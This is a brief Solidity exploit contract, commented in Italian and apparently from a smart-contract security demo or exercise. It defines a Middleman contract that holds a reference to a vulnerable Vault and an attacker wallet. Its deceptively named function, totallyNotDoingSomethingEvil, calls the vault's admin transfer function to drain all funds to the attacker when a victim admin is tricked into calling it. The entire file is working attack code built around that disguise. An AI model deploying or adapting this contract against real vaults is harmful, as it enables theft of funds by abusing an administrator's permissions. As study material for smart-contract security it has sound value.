// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "vault.sol";

contract Middleman {
    Vault public vault;
    address public attackerWallet;

    constructor(address payable _vulerableVault, address payable _attackerWallet) {
        // Otteniamo un riferimento all'istanza deployata del vault
        // cosi' da poterci interfacciare con esso
        vault = Vault(_vulerableVault);
        attackerWallet = _attackerWallet;
    }

    // Se la vittima chiama questa, possiamo prosciugare il balance del Vault
    // ereditando i suoi permessi di admin.
    function totallyNotDoingSomethingEvil() public {
        vault.admin_transferAllFundsTo(payable(attackerWallet));
    }
}